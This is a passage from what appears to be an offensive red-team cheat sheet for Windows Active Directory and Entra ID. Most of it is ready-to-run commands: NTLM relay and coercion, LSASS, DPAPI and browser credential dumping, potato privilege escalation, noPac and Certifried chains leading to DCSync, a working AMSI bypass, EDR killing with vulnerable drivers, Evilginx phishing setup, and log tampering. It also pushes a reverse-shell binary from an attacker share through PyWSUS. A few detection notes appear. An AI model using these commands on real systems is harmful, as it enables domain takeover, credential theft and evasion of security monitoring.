Companion: **CVE-2024-43532** (RemoteRegistry NTLM relay), **CVE-2025-21293** (Performance Counters → NTLM coerce), **WebClient (WebDAV) coerce** for cross-protocol HTTP→LDAP relay even on signed SMB nets.

### 9.5 WebClient / WebDAV coerce (HTTP-based, bypasses SMB signing)
```bash
# Spin up WebDAV listener, coerce target into HTTP auth
PetitPotam.py -u low -p pass 'attacker@80/test' VICTIM
# Then relay HTTP NTLM to LDAP (no signing on LDAP by default if CB off)
ntlmrelayx.py -t ldap://DC --delegate-access --escalate-user owned -smb2support
# Trigger WebDAV via search-ms / autodiscover / printerbug w/ FQDN@port@path
SearchConnector.exe target  # SearchIndexer triggers WebClient
```

### 9.6 Signing / EPA / Channel Binding matrix
```bash
nxc smb subnet -u '' -p '' --gen-relay-list relay.txt
nxc ldap DC -u owned -p pass -M ldap-checker            # signing/CB on LDAP
nxc smb DC -u owned -p pass -M smb-signing              # signing required?
nxc smb subnet -u low -p pass -M webdav                 # WebClient enabled?
```
| Defense | Bypass |
|---|---|
| SMB signing required | use HTTP/LDAP/MSSQL relay paths, or WebDAV coerce |
| LDAP signing | relay to LDAPS |
| LDAPS Channel Binding | downgrade via WebDAV (HTTP → LDAP), or ESC8 (`certsrv` web) |
| EPA on /certsrv | RPC ICPR (ESC11) instead |
| Protected Users / RC4 disabled | use AES, request PKINIT |

---

## 10. Coerced Authentication Primitives

- **PetitPotam** — MS-EFSRPC coerce DC auth to attacker
- **PrinterBug (SpoolSample)** — MS-RPRN spooler coerce
- **DFSCoerce** — MS-DFSNM coerce, often unpatched
- **ShadowCoerce** — MS-FSRVP volume shadow copy coerce
- **WebDAV coerce (PrivExchange-style)** — HTTP-based NTLM coerce
- **WSUS coerce** — abuse update server auth flows
- **Certifried-style coerce + ADCS** — chain to domain admin
- **MS-EVEN6 / MS-EFSR / MS-RPRN** — various RPC-based coerces

Use the matrix in §9.1 to pick the right primitive for the target patch level.

---

## 11. Credential Loot on Hosts

### 11.1 LSASS
```cmd
:: Mimikatz
sekurlsa::logonpasswords
sekurlsa::ekeys
:: nanodump (OPSEC)
nanodump.exe -w lsass.dmp
:: pypykatz offline
pypykatz lsa minidump lsass.dmp
:: comsvcs.dll (LOLBin)
rundll32 C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\loot\l.dmp full
```

### 11.2 SAM / SECURITY / SYSTEM
```cmd
reg save HKLM\SAM sam.sav
reg save HKLM\SYSTEM sys.sav
reg save HKLM\SECURITY sec.sav
secretsdump.py -sam sam -system sys -security sec LOCAL
```

### 11.3 DPAPI
```cmd
:: User MasterKeys
dir %APPDATA%\Microsoft\Protect\<SID>\
mimikatz # sekurlsa::dpapi
mimikatz # dpapi::masterkey /in:MASTERKEY /sid:<SID> /password:<usrpass>
:: System MasterKey (DPAPI_SYSTEM secret from LSA)
mimikatz # !sekurlsa::dpapisystem
:: Decrypt blobs
dpapi::cred /in:Credential /masterkey:<KEY>
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /masterkey:<KEY>
:: Linux offline
impacket-dpapi masterkey -file MASTERKEY -password 'pass' -sid S-1-5-21-...
impacket-dpapi credential -file CRED -masterkey <key>
:: Domain backup key (DA-only) → decrypt every user's DPAPI
mimikatz # lsadump::backupkeys /system:DC /export
```

### 11.4 PSReadLine console history (huge win, often forgotten)
```powershell
Get-Content (Get-PSReadlineOption).HistorySavePath
type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
# Per all users on host
gci C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -EA 0 | %{ Write-Host $_; gc $_ }
```
cmd.exe history not persisted. WSL: `~/.bash_history`.

### 11.5 Clipboard history (Win10+)
```powershell
# Live
Get-Clipboard
Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.Clipboard]::GetText()
# Persistent (if enabled)
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Windows\Clipboard\" -Recurse
# Cloud-synced clipboard via Microsoft Account → relevant in tenant compromise
```

### 11.6 Credential Manager / Vault
```cmd
vaultcmd /list
vaultcmd /listcreds:"Web Credentials" /all
cmdkey /list
mimikatz # vault::list
mimikatz # vault::cred /patch
```

### 11.7 Browsers (Chrome/Edge/Firefox)
```bash
SharpChrome.exe logins /unprotect
SharpChrome.exe cookies /unprotect
firefox_decrypt.py
# Edge — same as Chrome (DPAPI)
```

### 11.8 LSA Secrets / Cached
```bash
secretsdump.py -sam ... -security ... LOCAL
# DCC2 hashes → hashcat -m 2100
# LSA secrets → service account passwords plaintext, $MACHINE.ACC, DPAPI_SYSTEM
```

### 11.9 Kerberos tickets on disk
```cmd
klist
mimikatz # sekurlsa::tickets /export
Rubeus.exe dump /service:krbtgt /nowrap
Rubeus.exe triage
```

### 11.10 Files
```powershell
gci C:\ -Include *.kdbx,*.config,web.config,unattend.xml,sysprep.xml,*.vmdk,*.bak,*.ps1,*.bat,id_rsa* -Recurse -EA 0
findstr /SI /M "password" *.xml *.ini *.txt *.config
# SYSVOL Group Policy Preferences cpassword
nxc smb DC -u owned -p pass -M gpp_password
```

---

## 12. Windows Token / Privilege Escalation

### 12.1 Enumeration
```cmd
whoami /priv
whoami /groups
seatbelt -group=All
winPEAS.exe quiet cmd
```

### 12.2 SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
"Potato" family — coerce SYSTEM auth, relay to local RPC.
```cmd
:: Modern (works post-2022 patches)
GodPotato.exe -cmd "cmd /c whoami"
:: Server family
JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"
PrintSpoofer.exe -i -c cmd.exe       :: needs Print Spooler
RoguePotato.exe -r <attacker_ip> -e cmd.exe -l 9999
SweetPotato.exe -p cmd.exe
EfsPotato.exe "cmd /c whoami"
LocalPotato.exe -cmd cmd.exe
DCOMPotato.exe
```

### 12.3 SeBackupPrivilege + SeRestorePrivilege
**SeBackup**: read any file, including `NTDS.dit`.
```cmd
:: From DC with SeBackup (e.g. Backup Operators)
diskshadow.exe /s diskshadow.txt
:: diskshadow.txt:
:: set context persistent nowriters
:: add volume C: alias backup
:: create
:: expose %backup% Z:
robocopy /b Z:\Windows\NTDS . NTDS.dit
reg save HKLM\SYSTEM SYSTEM /y
secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
```
**SeRestore**: write to any file → drop DLL in protected path, replace SYSTEM service binary, modify `utilman.exe`/`sethc.exe`.
```cmd
:: With SeRestore + SeTakeOwnership often paired
:: Replace service binary or AlwaysInstallElevated MSI
:: Or modify HKLM\SYSTEM\CurrentControlSet\Services\* ImagePath
```
PowerShell helper:
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\loot\ntds.dit -Overwrite
```

### 12.4 SeDebugPrivilege
Open any process → LSASS dump → tokens.
```cmd
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
```

### 12.5 SeLoadDriverPrivilege
Load arbitrary signed driver → kernel exec.
```cmd
:: EvilDriver / Capcom / Dell DBUtil2_3.sys (BYOVD)
EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\path\Capcom.sys
:: trigger via ExploitCapcom
```

### 12.6 SeTakeOwnershipPrivilege
Take ownership of any object → grant self perms → modify.
```powershell
takeown /F C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SAM /grant:r "$env:USERNAME:(F)"
```

### 12.7 SeManageVolumePrivilege
Trigger storage MMC RPC → arbitrary write as SYSTEM (Win10/11).
```cmd
SeManageVolumeExploit.exe
```

### 12.8 SeTcbPrivilege
Act as part of OS → forge tokens via `LsaLogonUser`. Practically game over.

### 12.9 SeCreateTokenPrivilege
Forge access tokens directly (rare; SYSTEM-equivalent).
```cmd
SeCreateTokenExploit.exe   :: forges LSA token
```

### 12.10 Quick triage of `whoami /priv`
| Priv | Path |
|---|---|
| SeImpersonate / SeAssignPrimaryToken | Potato → SYSTEM |
| SeBackup | Read NTDS.dit, SAM, LSA → secretsdump |
| SeRestore | Write protected paths → SYSTEM service binary swap |
| SeDebug | LSASS dump |
| SeTakeOwnership | Take SAM/SYSTEM, then read |
| SeLoadDriver | BYOVD kernel exec |
| SeManageVolume | StorageMM exploit |
| SeTcb / SeCreateToken | Direct token forge |

### 12.11 Other classic Windows local
- **AlwaysInstallElevated** (HKLM+HKCU regs = 1) → `msiexec /quiet /i evil.msi`
- **Unquoted service paths** + `C:\Program*.exe`
- **Service ACL** writeable → `sc config name binPath= "..."`
- **DLL hijack** (PATH order, sideloading)
- **UAC bypass** (fodhelper, computerdefaults, ICMLuaUtil) — not privesc to SYSTEM but to High Integrity
- **Token impersonation via incognito (`list_tokens -u`, `impersonate_token`)**
- **Hot patch / printnightmare / certifried / spoolfool** — patched but worth checking
- **CVE-2022-26923 (Certifried)** — see §13
- **CVE-2021-42278/42287 (sAMAccountName / noPac)** — see §13
- **MS14-068 (GoldenPac, CVE-2014-6324)** — see §13


---

## 13. PAC / Computer Account CVEs (noPac, GoldenPac, Certifried)

### 13.1 noPac — CVE-2021-42278 + CVE-2021-42287
**Bug:** sAMAccountName spoofing — rename a computer account to match a DC name (without `$`); KDC issues TGT for renamed account, then S4U2self returns ticket as DC.
**Prereq:** any user creds, MAQ ≥ 1 (or pre-existing controlled computer).
```bash
# Impacket
noPac.py -dc-ip 10.0.0.1 -dc-host DC01 domain.local/owned:pass \
  --impersonate Administrator -use-ldap -shell
# Manual chain
addcomputer.py -computer-name 'pwn$' -computer-pass 'P!' -dc-host DC01 'domain.local/owned:pass'
renameMachine.py -current-name 'pwn$' -new-name 'DC01' 'domain.local/owned:pass'
getTGT.py 'domain.local/DC01:P!' -dc-ip DC
renameMachine.py -current-name 'DC01' -new-name 'pwn$' 'domain.local/owned:pass'
KRB5CCNAME=DC01.ccache getST.py -self -impersonate Administrator -altservice 'cifs/DC01.domain.local' -k -no-pass 'domain.local/DC01'
KRB5CCNAME=Administrator@cifs_DC01.domain.local@DOMAIN.LOCAL.ccache secretsdump.py -k -no-pass DC01.domain.local -just-dc
```
**Patches:** Nov 2021 (KB5008380, KB5008602). Detection: 4741/4742 with `$`-stripped name; TGT for principal whose sAMAccountName changed mid-flight.

### 13.2 GoldenPac — MS14-068 / CVE-2014-6324
**Bug:** KDC fails to validate PAC signatures → forge PAC claiming Domain Admin membership for any user.
**Prereq:** valid domain user creds; unpatched DC (pre-2014 patches).
```bash
goldenPac.py 'domain.local/owned:pass'@DC01.domain.local
# Or impacket
ms14-068.py -u owned@domain.local -s S-1-5-21-... -d DC -p pass
mimikatz # kerberos::golden /user:owned /domain:domain.local /sid:S-1-5-21-... /target:DC /service:cifs /rc4:<dummy> /ptt
```
Mostly historical, but unpatched legacy DCs still appear in HTB / lab / OT networks.

### 13.3 Certifried — CVE-2022-26923
**Bug:** ADCS Machine template authenticates by `dNSHostName`; computer object owner can rewrite `dNSHostName` to match a DC → enroll cert → auth as DC.
**Prereq:** ability to create/own a computer (MAQ ≥ 1 or GenericWrite on existing computer); ADCS with Machine template enabled.
```bash
# Add computer + set dNSHostName=DC fqdn
certipy account create -u owned@domain.local -p pass -user 'pwn' -pass 'P!' -dns DC.domain.local
# Enroll Machine template
certipy req -u 'pwn$@domain.local' -p 'P!' -ca CA -template Machine
# Auth → DC$ NT hash
certipy auth -pfx pwn.pfx -dc-ip DC
# DCSync
secretsdump.py -hashes :<DC$_hash> 'domain.local/DC$@DC' -just-dc
```
**Patch:** May 2022 (KB5014754) — strong cert mapping enforcement (`StrongCertificateBindingEnforcement=2`).

### 13.4 sAMAccountName Spoofing variants
- **CVE-2022-26925 (PetitPotam unauth via LSARPC)** — re-enables anon coerce on LSARPC even after EFSRPC patch
- **CVE-2023-21746 (LocalPotato)** — local NTLM reflection from SYSTEM RPC to SMB

### 13.5 Detection of all above
Watch:
- 4662 with object class `computer` + property `dNSHostName` modification
- 4741 (computer created) by non-admin
- 4742 (computer changed) where `sAMAccountName` toggles between presence/absence of `$`
- ADCS audit 4886/4887 with SAN/UPN containing high-value names
- KDC events 4768/4769 for accounts whose name contains a DC hostname

---

## 14. Lateral Movement

### 14.1 Impacket (Linux)
```bash
psexec.py domain.local/user:pass@HOST
smbexec.py domain.local/user:pass@HOST          # quieter than psexec
wmiexec.py domain.local/user:pass@HOST          # no service
atexec.py domain.local/user:pass@HOST 'whoami'  # task scheduler
dcomexec.py domain.local/user:pass@HOST         # MMC20/ShellWindows DCOM
mssqlclient.py domain.local/user:pass@SQL -windows-auth   # xp_cmdshell
```

### 14.2 Kerberos (PtT / PtH overpass)
```bash
KRB5CCNAME=admin.ccache wmiexec.py -k -no-pass HOST.domain.local
getTGT.py domain.local/user -hashes :HASH
```

### 14.3 WinRM
```bash
evil-winrm -i HOST -u user -p pass
nxc winrm HOST -u user -H NTHASH -x 'whoami'
```

### 14.4 RDP w/ NTLM
```bash
xfreerdp /u:user /pth:HASH /v:HOST /dynamic-resolution
```

### 14.5 Stealth lateral options
- **WMI Event Subscription** — fileless persistence + lateral
- **DCOM lateral exec** — `MMC20.Application`, `ShellWindows`
- **WinRM with -Authentication Negotiate** — looks like admin tooling
- **PsExec via custom service name + signed binary**
- **SMB named pipe C2** — peer-to-peer beacons, single egress
- **TCP-only beacon over RDP virtual channel**
- **Remote registry + scheduled task XML drop**

---

## 15. Persistence

- **Golden Ticket** — krbtgt long-term forgery
- **Silver Ticket** — service-specific stealth
- **Skeleton Key** — LSASS patch
- **DSRM password sync** — DC local admin
- **AdminSDHolder ACL backdoor** — re-applied every 60 min via SDProp
- **Custom SSP / SSPI hijack**
- **GPO persistence**
- **Service account with non-expiring password**
- **Hidden user with denyACL on enum**
- **Krbtgt service principal modification**
- **GoldenGMSA** — root key knowledge → forge any gMSA password
- **Golden Certificate** — stolen CA key → forge any cert

### 15.1 DSRM password abuse
```cmd
mimikatz # lsadump::sam
# Use DSRM password to auth to DC locally
```

### 15.2 AdminSDHolder backdoor details
If attacker has WriteDACL/GenericAll on AdminSDHolder, grant self FullControl. SDProp runs every 60 minutes and re-stamps protected groups (Domain Admins, Enterprise Admins, etc.) with the same ACL.

### 15.3 Custom SSP
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d "...\0mimilib" /f
```

---

## 16. Trust Attacks

- **SID History injection** — golden ticket with foreign SID for cross-domain DA
- **Inter-Forest TGT (printer bug across trust)** — coerce trust DC
- **SID filtering bypass** — quarantine flag misconfig
- **Trust key extraction** — forge inter-realm TGT
- **Foreign Security Principal abuse**
- **Cross-forest Kerberoast**
- **AzureAD Connect / PHS sync abuse** — MSOL account password → DCSync

### 16.1 Trust key extraction
```bash
secretsdump.py child.parent.local/admin@DC -just-dc-user 'parent$'
```

### 16.2 SID History golden ticket
```bash
ticketer.py -nthash <child_krbtgt> -domain-sid <child> -domain child.parent.local \
  -extra-sid S-1-5-21-PARENT-519,S-1-5-21-PARENT-512 Administrator
```

---

## 17. Group Policy Attacks

- **GPO modification** — write to gPCFileSysPath in SYSVOL
- **SharpGPOAbuse** — add scheduled task / immediate task / rights
- **GPP cpassword (legacy)** — Groups.xml decrypt
- **MSI/Software Installation GPO** — push malicious MSI
- **Logon/Startup script abuse**

### 17.1 SharpGPOAbuse examples
```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author NT_AUTH --Command cmd.exe --Arguments "/c net group Domain Admins attacker /add /domain" --GPOName "Vulnerable GPO"
SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeDebugPrivilege" --UserAccount owned --GPOName "Vulnerable GPO"
```

### 17.2 Logon script abuse
Drop payload in `\\domain.local\SYSVOL\domain.local\scripts\logon.bat` if writable.

---

## 18. WSUS Attacks

- **WSUS HTTP (no TLS)** — MITM update channel, inject signed PsExec.exe + cmdline → SYSTEM
- **PyWSUS / WSUSpect** — replay legitimate Microsoft-signed binaries with malicious args
- **WSUSpendu** — push fake update to all clients via DB write on WSUS server
- **SCCM/WSUS shared SQL** — abuse SUSDB write access for update injection
- **WSUS server compromise → domain-wide RCE** — every client pulls "update"
- **CVE-2025-59287 WSUS RCE** — deserialization in AuthorizationCookie, unauth SYSTEM
- **WSUS NAA cred extract** — Network Access Account credentials in WMI/registry
- **Group Policy WSUS redirect** — write WUServer/WUStatusServer reg keys via GPO
- **Local WSUS hijack** — write HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate for self-update poison
- **Autopatch/Intune coexist abuse** — MDM channel takeover

### 18.1 PyWSUS example
```bash
pywsus.py -t WSUS -c "psexec.exe" -a "\\attacker\share\rev.exe"
```

### 18.2 WSUSpect
Replace legitimate update file with malicious but signed binary plus command-line arguments.

---

## 19. SCCM / MECM Attacks

- **TAKEOVER-1 to TAKEOVER-9** — SCCM hierarchy privesc chains (SpecterOps research)
- **NAA credential extract** — `CCM_NetworkAccessAccount` blob, DPAPI decrypt → domain creds
- **PXE boot media password crack** — extract task sequence policy, AES decrypt
- **Client push installation relay** — coerce site server, NTLM relay to MSSQL/SMB
- **Site database access** — RBAC_Admins table, grant Full Admin role
- **Application deployment abuse** — push package as SYSTEM to all clients
- **Distribution Point access** — anonymous SMB share, content extraction
- **AdminService API abuse** — REST endpoint on SMS Provider for cmd exec
- **CMPivot RCE** — query language abuse for arbitrary script
- **Management Point relay** — CCM_HTTPHANDLER coerce → relay

### 19.1 NAA credential extraction
```powershell
# From SCCM client
Get-WmiObject -Namespace "root\ccm\policy\Machine\ActualConfig" -Class CCM_NetworkAccessAccount
# Decrypt blob with DPAPI
```

### 19.2 PXE boot abuse
```bash
# Extract encrypted media password from PXE boot image
pxethief.py -i <PXE-server>
```

---

## 20. EntraID / Azure AD

- **Device Code phishing** — `/devicecode` endpoint, send code via email/Teams, victim grants
- **Illicit Consent Grant (OAuth phish)** — malicious app, victim approves, refresh token stolen
- **Token theft via TokenTactics / ROADtools** — refresh token replay, FOCI family abuse
- **Family of Client IDs (FOCI)** — exchange token between Microsoft first-party apps (Teams→Graph→Outlook)
- **Primary Refresh Token (PRT) extraction** — Mimikatz cloudap, dpapi::cloudapkd
- **PRT cookie forge (x-ms-RefreshTokenCredential)** — SSO bypass, browser session
- **Seamless SSO Silver Ticket** — `AZUREADSSOACC$` NT hash → forge TGS for aadg.windows.net.nsatc.net
- **PHS abuse (Pass-through hash sync)** — `MSOL_xxx` account → DCSync on-prem
- **PTA agent compromise** — Azure AD Connect Authentication Agent → cleartext logon capture
- **AD Connect server (Tier 0)** — extract MSOL credentials from ADSync DB (DPAPI key in registry)
- **Federation server (ADFS) golden SAML** — token-signing cert export → forge any user assertion
- **Cross-tenant access policy abuse** — guest invite, resource access
- **Conditional Access bypass** — legacy auth (IMAP/POP/SMTP basic), device code, browser bypass
- **MFA fatigue / push bombing** — repeat prompts until approval
- **MFA SIM swap / TOTP seed steal**
- **Authenticator app session token replay** — extract from device
- **AzureHound** — graph-based attack path mapping
- **Service Principal abuse** — stale SP with high perms, cert/secret reuse
- **App registration owner abuse** — add own credentials to existing app
- **Application admin / Cloud App admin** — add secrets to any non-privileged SP
- **Privileged Auth Admin / User Admin** — reset Global Admin password (legacy)
- **Hybrid Identity Admin** — modify sync, push creds
- **Directory Sync Account (Sync_*)** — replicate hashes, hidden role
- **Partner relationship (GDAP/DAP)** — CSP tenant takeover via partner compromise
- **Managed Identity token abuse** — IMDS (169.254.169.254) on Azure VM → token → resource pivot
- **Storage account key / SAS token leak** — keyvault/config exposure
- **Key Vault access policy / RBAC abuse** — secret read → SP cred → escalation
- **Azure RBAC privesc** — Owner/User Access Administrator on subscription
- **Custom role with `*/write`** — sneaky perms
- **Run Command / RunCommandManagedDisk** — exec on VM via control plane
- **Automation Account / Runbook** — RunAs cert export → privesc
- **Logic App / Function App connection abuse**
- **Conditional Access policy modification** — disable MFA for attacker
- **Cross-tenant synchronization abuse** — invite as External Identity → privileged in target
- **Temporary Access Pass (TAP) abuse** — User Admin issues TAP for victim
- **Authentication method tampering** — register attacker FIDO2/phone for victim
- **BPRT (Bulk Provisioning Token)** — register rogue devices, get PRT
- **Workplace Join / Device Registration abuse** — fake device, get PRT
- **Intune script push** — Win32 app or PowerShell script → SYSTEM on managed endpoints
- **Intune MDM enrollment abuse** — admin role pushes config profile with cert
- **Microsoft Graph abuse** — Mail.ReadWrite, Files.ReadWrite.All, Directory.ReadWrite.All SP
- **Exchange Online application access policy bypass**
- **Power Platform / Dataverse privilege flaws**
- **B2B / B2C tenant pivot**
- **Continuous Access Evaluation (CAE) bypass** — token replay before revocation propagates

### 20.1 Device Code phishing
```bash
# Start device code flow
roadtx devicecode --client-id < Teams / Office client >
# Send user_code to victim; harvest tokens when approved
```

### 20.2 Illicit consent grant
```bash
# Create multi-tenant app with Mail.ReadWrite
# Victim approves → attacker gets refresh token
roadtx prtenrich --prt <PRT>
```

### 20.3 Managed identity token abuse
```bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true
```

---

## 21. Cross-Cloud / Hybrid Pivots

- **AAD Connect cloud sync → on-prem DCSync (and reverse)**
- **Pass-through agent → cleartext password capture via DLL injection**
- **Federation cert theft → forge SAML for any cloud app**
- **Privileged Identity Management (PIM) eligible role activation race**
- **Break-glass account credential reuse**

### 21.1 PIM race
If attacker has User Admin / Privileged Auth Admin, activate PIM role for Global Admin, perform action, deactivate before detection.

### 21.2 Federation cert theft
```bash
# Export ADFS token-signing cert
mimikatz # crypto::certificates /systemstore:CURRENT_USER /export
# Forge SAML assertion
python3 golden_saml.py --domain domain.com --idp_id http://sts.domain.com/adfs/services/trust --pem-file cert.pem --subject victim@domain.com
```

---

## 22. Defense Evasion — Process / Memory

- **AMSI bypass** — patch AmsiScanBuffer in amsi.dll (E_INVALIDARG return)
- **AMSI provider unregistration** — registry HKLM\Software\Microsoft\AMSI\Providers
- **AMSI hardware breakpoint bypass** — Vectored Exception Handler
- **ETW patching** — EtwEventWrite / NtTraceEvent ret 0
- **ETW-TI bypass** — Threat Intelligence provider
- **PPL bypass** — driver load (PPLKiller, RTCore64, gdrv.sys BYOVD)
- **PPLFault / PPLDump** — ProcessSnapshot abuse for LSASS dump
- **Direct syscalls (Hell's Gate, Halo's Gate, Tartarus)** — skip ntdll user-land hooks
- **Indirect syscalls (SysWhispers3)** — return into ntdll syscall instruction for stack legitimacy
- **Unhooking ntdll** — fresh copy from disk / KnownDlls / suspended process
- **Module stomping** — load benign DLL, overwrite .text with shellcode
- **Module shifting / hollowing**
- **Process hollowing (RunPE)**
- **Process Doppelgänging (TxF transactions)**
- **Process Herpaderping** — modify file after section creation
- **Process Ghosting** — delete-pending file backed section
- **Transacted Hollowing**
- **PoolParty (8 variants)** — thread pool injection
- **EarlyCascade / EarlyBird APC injection**
- **NtMapViewOfSection cross-process injection**
- **DLL sideloading** — drop legit signed exe + malicious DLL beside it
- **Phantom DLL hijack** — exploit missing DLL load path
- **COM hijacking** — HKCU\Software\Classes\CLSID\{...} redirect
- **AppInit_DLLs / AppCertDLLs / Image File Execution Options (legacy)**
- **KernelCallbackTable hijack**
- **Thread Name-Calling injection (SetThreadDescription)**

### 22.1 AMSI bypass example
```powershell
$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" }
$b = $a.GetFields("NonPublic,Static") | Where-Object { $_.Name -like "*Context" }
[IntPtr]$ptr = $b[0].GetValue($null)
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

### 22.2 ETW patch
```csharp
// Patch EtwEventWrite to return 0
```

---

## 23. Defense Evasion — Loader / Payload

- **Reflective DLL injection (Stephen Fewer)**
- **sRDI** — shellcode RDI conversion
- **Donut** — PE/.NET → position-independent shellcode
- **PE2SHC, ScareCrow** — encrypted, signed loaders
- **NimPlant / NimCrypt / Nim-RustLoader** — uncommon language tradecraft
- **C# .NET assembly load in-memory** — `Assembly.Load(byte[])`, execute-assembly
- **BOF (Beacon Object File)** — in-process, no fork-and-run
- **Inline-EA / inline-execute** — Cobalt Strike postex without spawning
- **Fork & run replacement** — sacrificial process via ppid_spoof + blockdlls
- **PPID spoofing** — UpdateProcThreadAttribute PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
- **Block non-MS DLLs** — PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY
- **CIG (Code Integrity Guard)**
- **ACG abuse / bypass for shellcode**
- **Stack spoofing (CallStackMasker, SilentMoonwalk)** — fake call stack to bypass EDR thread inspection
- **Sleep obfuscation (Ekko, Foliage, Zilean, DeathSleep, MutationGate)** — encrypt heap during sleep, ROP wakeup
- **Heap encryption (Ekko ROP chain via timer queue)**
- **TimerQueue ROP for sleep masking**
- **Sleep with hardware breakpoint masking**
- **Hardware Breakpoint hooking (no IAT/inline)** — bypass userland EDR
- **Vectored Exception Handler (VEH) abuse**

---

## 24. EDR Bypass / Killing

- **BYOVD (Bring Your Own Vulnerable Driver)** — RTCore64.sys, gdrv.sys, dbutil.sys, procexp152.sys arbitrary RW kernel
- **EDRSandblast** — disable kernel callbacks via vulnerable driver
- **Backstab / Blackout** — kill PPL EDR via vuln driver
- **Terminator** — Zemana driver kill
- **Spyboy / KillEDR family**
- **EDRKillShifter (RansomHub)**
- **Kernel callback removal** — PsSetCreateProcessNotifyRoutine patch
- **Minifilter altitude unload** — detach EDR file callbacks
- **Object callback patch** — PsProcessType->CallbackList
- **WMI subscription removal** — EDR persistence cleanup
- **EDR DLL unhooking via fresh ntdll**
- **Suspending EDR threads** — token-impersonation + suspend
- **Driver signature enforcement bypass via testsigning / DSE off via vuln driver**
- **NtSetSystemEnvironmentValueEx UEFI tamper (research)**
- **PG (PatchGuard) trick suspend / DSEFix-style**
- **Telemetry pipeline starvation** — fill ETW logger buffer
- **MpCmdRun.exe abuse** — Defender LOLBIN, exclude paths via tampering tokens

### 24.1 EDRSandblast
```bash
EDRSandblast.exe -- vulnerable-driver RTCore64.sys --uninstall <EDR service name>
```

---

## 25. AV / Defender Specific

- **Defender exclusion via TrustedInstaller token** — runas /trustlevel, modify Defender prefs
- **MpPreference tamper** — requires SYSTEM + tamper protection off
- **DisableAntiSpyware reg (legacy)**
- **MpClient.dll / MpEngine.dll DoS / crash via crafted file**
- **Kaspersky / CrowdStrike / SentinelOne / Carbon Black driver-specific bypasses**
- **Trend Micro Apex tamper bypass**
- **Cylance ML model poisoning (cylance-bypass)** — append benign strings/PE sections
- **AV emulator escape** — sleep skip detection, env keying

### 25.1 Defender exclusion via TrustedInstaller
```cmd
# Impersonate TrustedInstaller, add exclusion
mimikatz # token::elevate
powershell -Command "Add-MpPreference -ExclusionPath C:\loot"
```

---

## 26. OPSEC / Beacon Drop Without Trip

- **Stageless payload** — avoid stage HTTP fetch (signature-rich)
- **HTTPS C2 with valid cert + jitter + sleep ≥ 60s + Malleable C2 profile matching real product UA**
- **Domain fronting / redirector chains (CDN77, Cloudflare, Fastly with origin pull)**
- **CloudFront / Azure Front Door redirector**
- **Legitimate cloud C2 (Slack, Discord, Telegram, Teams, Notion, Trello, Dropbox, OneDrive, GitHub Gists)** — covert via API
- **DNS over HTTPS C2 (DoH)**
- **gRPC / WebSocket C2 in modern app traffic**
- **Encrypted shellcode + per-host key derivation (env keying — domain SID, hostname, MAC)**
- **GargoyleBypass / Gargoyle** — non-executable shellcode at rest, exec via APC
- **Phantom V2 / Cobalt Strike Sleep mask kit + RW→RX→RW cycling**
- **Kaspersky/Defender YARA evasion** — randomize import names, strings, entropy padding
- **Entropy reduction** — base64 strings, fake metadata, signed timestamps
- **Authenticode signed loader** — stolen / EV / Microsoft cross-signed cert
- **Signed ATTRIB executable / signed Microsoft binary as loader (LOLBin chain)**
- **Living Off The Land Binaries (LOLBAS)** — regsvr32, mshta, installutil, msbuild, wmic, cmstp, pcalua, forfiles, dfsvc, dnscmd
- **Office payloads** — VBA stomping, remote template injection, XLL, Excel 4.0 macros (legacy), MSI, OneNote .one HTA, LNK + ISO container (HTML smuggling delivery)
- **HTML smuggling** — JS Blob → ISO/IMG/VHD bypassing MOTW
- **Container format MOTW bypass** — ISO/IMG/VHDX evade Mark-of-the-Web (CVE-2022-41091 etc)
- **MotW stripping** — extract via 7zip pre-2023, etc.
- **Stealthy persistence** — COM hijack, registered task with hidden flag, WMI eventfilter, BITS jobs, scheduled task with /SD and SDDL hide

---

## 27. Initial Access Stealth

- **OneDrive / SharePoint phish (trusted domain)**
- **OAuth illicit consent (token persistence, no creds touched)**
- **Browser-in-the-Browser phish**
- **Adversary-in-the-Middle (Evilginx, Modlishka, Muraena)** — capture session cookies, MFA bypass
- **Tycoon 2FA / Mamba 2FA / EvilProxy PhaaS**
- **QR phishing (Quishing)** — out-of-band MFA bypass
- **MFA fatigue + Teams/SMS pretext**
- **Search engine ads (malvertising)** — typosquat installer
- **Chrome extension delivery via stolen dev account**
- **NPM / PyPI dependency confusion for build-time RCE on dev machines**

### 27.1 Evilginx phishing
```bash
evilginx config domain phishing.com
evilginx phishlets hostname o365 login.microsoftonline.com
evilginx lures create o365
# Distribute lure URL; capture session cookie + tokens
```

---

## 28. Anti-Forensics / Log Tamper

- **EventLog clearing → suspicious; instead use ETW provider unregister + targeted log thread suspend**
- **Phant0m / EventCleaner** — kill Eventlog service threads
- **USN journal delete** (`fsutil usn deletejournal`)
- **Prefetch wipe**
- **Timestomping** (`SetFileTime`)
- **Sysmon driver unload via vuln driver**
- **WEF/WEC subscription poison**
- **PowerShell ScriptBlock logging bypass**
